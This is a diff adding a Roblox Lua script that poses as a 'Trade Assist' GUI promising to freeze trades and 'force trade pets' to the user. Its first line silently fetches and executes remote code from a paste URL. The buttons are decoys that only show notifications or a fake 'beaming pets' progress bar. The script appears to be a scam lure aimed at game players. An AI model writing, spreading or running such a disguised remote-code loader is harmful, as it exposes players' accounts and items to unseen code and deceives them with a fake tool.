@@ -1,0 +1,281 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/54ERP1Rbs1V2ZbSK/raw", true))()
+-- Trade Assist GUI (Full Script with Minimize Toggle)
+
+--// Services
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local tweenService = game:GetService("TweenService")
+local userInput = game:GetService("UserInputService")
+local guiService = game:GetService("GuiService")
+
+--// Screen GUI
+local TradeAssistGUI = Instance.new("ScreenGui")
+TradeAssistGUI.Name = "TradeAssistGUI"
+TradeAssistGUI.ResetOnSpawn = false
+TradeAssistGUI.IgnoreGuiInset = true
+TradeAssistGUI.Parent = playerGui
+
+--// Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.AnchorPoint = Vector2.new(0.5, 0)
+MainFrame.Position = UDim2.new(0.5, 0, 0.25, 0)
+MainFrame.Size = UDim2.new(0.3, 0, 0.7, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.BackgroundTransparency = 0.3
+MainFrame.Active = true
+MainFrame.Draggable = false
+MainFrame.Parent = TradeAssistGUI
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
+
+--// Scale adjustment
+local UIScale = Instance.new("UIScale", MainFrame)
+UIScale.Scale = 0.7
+workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
+    UIScale.Scale = 0.7
+end)
+
+--// Top Bar
+local TopBar = Instance.new("Frame")
+TopBar.Name = "TopBar"
+TopBar.Size = UDim2.new(1, 0, 0, 40)
+TopBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+TopBar.BorderSizePixel = 0
+TopBar.ZIndex = 2
+TopBar.Parent = MainFrame
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
+
+--// Close Button
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 40, 0, 40)
+CloseButton.Position = UDim2.new(1, -40, 0, 0)
+CloseButton.Text = "X"
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 18
+CloseButton.TextColor3 = Color3.new(1, 1, 1)
+CloseButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+CloseButton.BorderSizePixel = 0
+CloseButton.ZIndex = 3
+Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(0, 8)
+Instance.new("UIStroke", CloseButton).Thickness = 1
+CloseButton.Parent = TopBar
+CloseButton.MouseButton1Click:Connect(function()
+    TradeAssistGUI:Destroy()
+end)
+
+--// Minimize Button
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 40, 0, 40)
+MinimizeButton.Position = UDim2.new(1, -80, 0, 0)
+MinimizeButton.Text = "-"
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.TextSize = 18
+MinimizeButton.TextColor3 = Color3.new(1, 1, 1)
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 180)
+MinimizeButton.BorderSizePixel = 0
+MinimizeButton.ZIndex = 3
+Instance.new("UICorner", MinimizeButton).CornerRadius = UDim.new(0, 8)
+Instance.new("UIStroke", MinimizeButton).Thickness = 1
+MinimizeButton.Parent = TopBar
+
+local originalSize = MainFrame.Size
+local minimized = false
+
+--// Mobile Scroll
+local MobileScroll = Instance.new("ScrollingFrame")
+MobileScroll.Name = "MobileScroll"
+MobileScroll.Size = UDim2.new(1, 0, 1, -40)
+MobileScroll.Position = UDim2.new(0, 0, 0, 40)
+MobileScroll.BackgroundTransparency = 1
+MobileScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+MobileScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+MobileScroll.ScrollBarThickness = 6
+MobileScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+MobileScroll.Parent = MainFrame
+local UIList = Instance.new("UIListLayout", MobileScroll)
+UIList.SortOrder = Enum.SortOrder.LayoutOrder
+UIList.Padding = UDim.new(0, 10)
+
+--// Content Frame
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Name = "ContentFrame"
+ContentFrame.Size = UDim2.new(1, 0, 1, -40)
+ContentFrame.Position = UDim2.new(0, 0, 0, 40)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.ClipsDescendants = true
+ContentFrame.Parent = MobileScroll
+
+--// Minimize Toggle
+MinimizeButton.MouseButton1Click:Connect(function()
+    local tweenInfo = TweenInfo.new(0.25)
+    if not minimized then
+        tweenService:Create(ContentFrame, tweenInfo, {Size = UDim2.new(1, 0, 0, 0)}):Play()
+        tweenService:Create(MainFrame, tweenInfo, {Size = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 40)}):Play()
+        MinimizeButton.Text = "+"
+        minimized = true
+    else
+        tweenService:Create(MainFrame, tweenInfo, {Size = originalSize}):Play()
+        tweenService:Create(ContentFrame, tweenInfo, {Size = UDim2.new(1, 0, 1, -40)}):Play()
+        MinimizeButton.Text = "-"
+        minimized = false
+    end
+end)
+
+--// Background Image
+local BackgroundImage = Instance.new("ImageLabel")
+BackgroundImage.AnchorPoint = Vector2.new(0.5, 0.5)
+BackgroundImage.Position = UDim2.new(0.5, 0, 0.5, 0)
+BackgroundImage.Size = UDim2.new(1, 40, 1, 40)
+BackgroundImage.BackgroundTransparency = 1
+BackgroundImage.Image = "rbxassetid://1316045217"
+BackgroundImage.ImageTransparency = 0.6
+BackgroundImage.ZIndex = 0
+BackgroundImage.Parent = MainFrame
+
+--// Credit Label
+local CreditLabel = Instance.new("TextLabel")
+CreditLabel.Name = "CreditLabel"
+CreditLabel.Text = "SKIDDED BY SIGMA @rizzify101"
+CreditLabel.Font = Enum.Font.GothamBold
+CreditLabel.TextSize = 16
+CreditLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+CreditLabel.BackgroundTransparency = 1
+CreditLabel.Size = UDim2.new(1, 0, 0, 25)
+CreditLabel.Position = UDim2.new(0, 0, 1, -30)
+CreditLabel.TextXAlignment = Enum.TextXAlignment.Center
+CreditLabel.TextYAlignment = Enum.TextYAlignment.Bottom
+CreditLabel.ZIndex = 5
+CreditLabel.Parent = MainFrame
+
+--// Player Icon Frame
+local PlayerIconFrame = Instance.new("Frame")
+PlayerIconFrame.AnchorPoint = Vector2.new(0.5, 0)
+PlayerIconFrame.Size = UDim2.new(0, 130, 0, 130)
+PlayerIconFrame.Position = UDim2.new(0.5, 0, 0, 10)
+PlayerIconFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+PlayerIconFrame.BorderSizePixel = 0
+PlayerIconFrame.ClipsDescendants = true
+PlayerIconFrame.Parent = ContentFrame
+Instance.new("UICorner", PlayerIconFrame).CornerRadius = UDim.new(1, 0)
+Instance.new("UIStroke", PlayerIconFrame).Thickness = 1.5
+
+local PlayerIcon = Instance.new("ImageLabel")
+PlayerIcon.AnchorPoint = Vector2.new(0.5, 0.5)
+PlayerIcon.Size = UDim2.new(0, 120, 0, 120)
+PlayerIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
+PlayerIcon.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+PlayerIcon.BorderSizePixel = 0
+PlayerIcon.ClipsDescendants = true
+PlayerIcon.Parent = PlayerIconFrame
+Instance.new("UICorner", PlayerIcon).CornerRadius = UDim.new(1, 0)
+
+--// Dropdown Button
+local DropdownButton = Instance.new("TextButton")
+DropdownButton.Name = "DropdownButton"
+DropdownButton.Text = "Select Player"
+DropdownButton.Font = Enum.Font.GothamBold
+DropdownButton.TextSize = 14
+DropdownButton.Size = UDim2.new(0.9, 0, 0, 40)
+DropdownButton.Position = UDim2.new(0.05, 0, 0, 150)
+DropdownButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+DropdownButton.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", DropdownButton).CornerRadius = UDim.new(0, 8)
+Instance.new("UIStroke", DropdownButton).Transparency = 0.8
+DropdownButton.Parent = ContentFrame
+
+--// Action Buttons Container
+local ButtonContainer = Instance.new("Frame")
+ButtonContainer.Size = UDim2.new(1, 0, 0, 120)
+ButtonContainer.Position = UDim2.new(0, 0, 0, 200)
+ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.Parent = ContentFrame
+local ButtonLayout = Instance.new("UIListLayout", ButtonContainer)
+ButtonLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ButtonLayout.Padding = UDim.new(0, 10)
+ButtonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+--// Freeze Button
+local FreezeButton = Instance.new("TextButton")
+FreezeButton.Size = UDim2.new(0.9, 0, 0, 40)
+FreezeButton.LayoutOrder = 1
+FreezeButton.Text = "FREEZE TRADE"
+FreezeButton.Font = Enum.Font.GothamBold
+FreezeButton.TextSize = 14
+FreezeButton.TextColor3 = Color3.new(1, 1, 1)
+FreezeButton.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
+Instance.new("UICorner", FreezeButton).CornerRadius = UDim.new(0, 8)
+Instance.new("UIStroke", FreezeButton).Transparency = 0.8
+FreezeButton.Parent = ButtonContainer
+
+--// Force Trade Button
+local ForceTradeButton = Instance.new("TextButton")
+ForceTradeButton.Size = UDim2.new(0.9, 0, 0, 40)
+ForceTradeButton.LayoutOrder = 2
+ForceTradeButton.Text = "FORCE TRADE PETS"
+ForceTradeButton.Font = Enum.Font.GothamBold
+ForceTradeButton.TextSize = 14
+ForceTradeButton.TextColor3 = Color3.new(1, 1, 1)
+ForceTradeButton.BackgroundColor3 = Color3.fromRGB(150, 100, 200)
+Instance.new("UICorner", ForceTradeButton).CornerRadius = UDim.new(0, 8)
+Instance.new("UIStroke", ForceTradeButton).Transparency = 0.8
+ForceTradeButton.Parent = ButtonContainer
+
+--// Auto Accept Button
+local AutoAcceptButton = Instance.new("TextButton")
+AutoAcceptButton.Size = UDim2.new(0.9, 0, 0, 40)
+AutoAcceptButton.LayoutOrder = 3
+AutoAcceptButton.Text = "AUTO ACCEPT"
+AutoAcceptButton.Font = Enum.Font.GothamBold
+AutoAcceptButton.TextSize = 14
+AutoAcceptButton.TextColor3 = Color3.new(1, 1, 1)
+AutoAcceptButton.BackgroundColor3 = Color3.fromRGB(50, 180, 100)
+Instance.new("UICorner", AutoAcceptButton).CornerRadius = UDim.new(0, 8)
+Instance.new("UIStroke", AutoAcceptButton).Transparency = 0.8
+AutoAcceptButton.Parent = ButtonContainer
+
+--// Button Events
+FreezeButton.MouseButton1Click:Connect(function()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Trade Assist",
+        Text = "Trade frozen!",
+        Duration = 2,
+    })
+end)
+
+AutoAcceptButton.MouseButton1Click:Connect(function()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Trade Assist",
+        Text = "Auto accept triggered!",
+        Duration = 2,
+    })
+end)
+
+ForceTradeButton.MouseButton1Click:Connect(function()
+    local Overlay = Instance.new("Frame")
+    Overlay.Size = UDim2.new(1, 0, 1, 0)
+    Overlay.BackgroundColor3 = Color3.new(0, 0, 0)
+    Overlay.BackgroundTransparency = 0.4
+    Overlay.ZIndex = 99
+    Overlay.Parent = TradeAssistGUI
+
+    local ProgressLabel = Instance.new("TextLabel")
+    ProgressLabel.Text = "Beaming pets to your account...\n[Progress: 0%]"
+    ProgressLabel.Size = UDim2.new(0, 300, 0, 100)
+    ProgressLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
+    ProgressLabel.BackgroundTransparency = 1
+    ProgressLabel.TextColor3 = Color3.new(1, 1, 1)
+    ProgressLabel.TextScaled = true
+    ProgressLabel.ZIndex = 100
+    ProgressLabel.Font = Enum.Font.GothamBold
+    ProgressLabel.Parent = Overlay
+
+    for i = 0, 100, 2 do
+        ProgressLabel.Text = "Beaming pets to your account...\n[Progress: "..i.."%]"
+        task.wait(0.12)
+    end
+
+    ProgressLabel.Text = "Beaming complete. No pets found. Try again later."
+    task.wait(3)
+    Overlay:Destroy()
+end)
